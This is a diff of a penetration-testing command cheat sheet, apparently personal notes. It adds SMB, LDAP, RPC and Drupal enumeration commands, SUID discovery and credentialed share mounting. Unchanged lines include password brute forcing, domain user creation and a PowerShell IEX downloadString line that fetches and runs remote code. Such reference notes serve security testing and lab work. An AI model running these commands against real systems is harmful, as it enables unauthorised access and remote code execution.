@@ -40,6 +40,21 @@ mv tmp wordlist.txt
 # for loop from x to z, incrementing in steps of y
 for i in $(seq x y z); do command_here; done;
 
+# base64 encode string
+echo -n string_here | base64
+
+# base64 decode string
+echo -n b64_string_here | base64 -d
+
+# sort textfile in alphabetical order + remove duplicates
+sort -u file_name_here
+
+# list every file with SUID bit set
+find / -user root -perm -4000 -exec ls -ldb {} \;
+
+# list files recursively
+find . -type f
+
 
 CEWL
 ----
@@ -54,6 +69,9 @@ crackmapexec protocol_here IP_here --pass-pol -u '' -p ''
 
 # brute force login
 crackmapexec protocol_here IP_here -u userlist.txt -p passwordlist.txt
+
+# crawl smb shares
+crackmapexec smb IP_here -u user -p password -M spider_plus
 
 
 DIG
@@ -71,6 +89,12 @@ dos2unix filename -n new_file
 # convert text files from Unix to DOS (LF -> CR/LF)
 unix2dos filename
 unix2dos filename -n new_file
+
+
+DRUPAL
+------
+# droopescan
+droopescan scan drupal -u IP_here
 
 
 ENV
@@ -109,12 +133,6 @@ ffuf -w /path/to/wordlist.txt -u http://IP_here/FUZZ -fc code_here
 
 # read raw HTTP request from file
 ffuf -w /path/to/wordlist.txt -request file_here
-
-
-FIND
-----
-# list every file with SUID bit set
-find / -user root -perm -4000 -exec ls -ldb {} \;
 
 
 FTP
@@ -170,6 +188,9 @@ nmap --script ldap-search IP_here
 ldapsearch -LLL -x -H ldap://IP_here -b '' -s base'(objectclass=*)'
 
 ldapsearch -x -h IP_here -s sub -b 'dc=domain_here,dc=dc2_here'
+
+# get domain name
+ldapsearch -x -h IP_here -s base namingcontexts
 
 
 MSSQL
@@ -249,11 +270,20 @@ net user user_here password_here /add /domain
 # add user to group 
 net group "group_name_here" /add user_here
 
+# display user information
+net user user_here /domain
+
 
 PERL
 ----
 # generate string of 20 A + concatenate with ABCD
 $(perl -e 'print "\x41" x 20 . "ABCD"')
+
+
+PHP
+---
+# interactive mode
+php -a
 
 
 PIP
@@ -275,6 +305,9 @@ IEX(New-Object Net.WebClient).downloadString('http://URL_here/file_here')
 
 # search for a file
 Get-Childitem –Path C:\ -Recurse –force -ErrorAction SilentlyContinue -Include *.extension_here -File
+
+# display user privs
+whoami /all
 
 
 PYTHON
@@ -308,14 +341,17 @@ rpcclient -U username%password IP_here
 # nmap script
 nmap --script rpc-grind IP_here
 
-# find domain name
+# rpcclient - find domain name
 querydominfo
 
-# domain look-up
+# rpcclient - domain look-up
 lookupdomain domaine_here
 
-# enumerate domain users
+# rpcclient - enumerate domain users
 enumdomusers
+
+# rpcclient - display description fields
+querydispinfo
 
 
 RPCBIND
@@ -368,8 +404,8 @@ SMB
 # enumerate shares with anonymous login
 smbclient -L smb -I IP_here
 
-# connect to a directory on a share as username
-smbclient \\\\IP_here\\some_share -D some_folder -U username%password
+# enumerate smb shares as user
+smbclient -L smb -I IP_here -U user
 
 # enumerate smb shares
 nmap --script=smb-enum-shares IP_here
@@ -380,11 +416,29 @@ smbmap -H IP_here
 # enumerate smb shares as user
 smbmap -u user -p password -d domain -H IP_here
 
-# upload file
+# enumerate smb shares
+crackmapexec smb IP_here --shares
+
+# enumerate smb shares as user
+crackmapexec smb IP_here -u user -p password --shares
+
+# connect to a directory on a share as username
+smbclient \\\\IP_here\\some_share -D some_folder -U username%password
+
+# smbclient - upload file
 put /path/to/local/file [/path/remote]
 
-# download file
+# smbclient - download file
 get /path/to/remote/file
+
+# mount smb share
+sudo mount -t cifs -o 'user=user_here,password=password_here' //IP_here/share_here /path/to/mountpoint
+
+
+SQLITE3
+--------
+# display database content
+sqlite3 database_here .dump
 
 
 SQLMAP
@@ -424,6 +478,12 @@ tcpdump -i interface_here src IP_here and dst IP_here
 
 # monitor specific dst IP and port
 tcpdump -i interface_here dst IP_here and port port_here
+
+
+VIM
+---
+# jump to line
+:line_number_here
 
 
 WINDOWS CLI
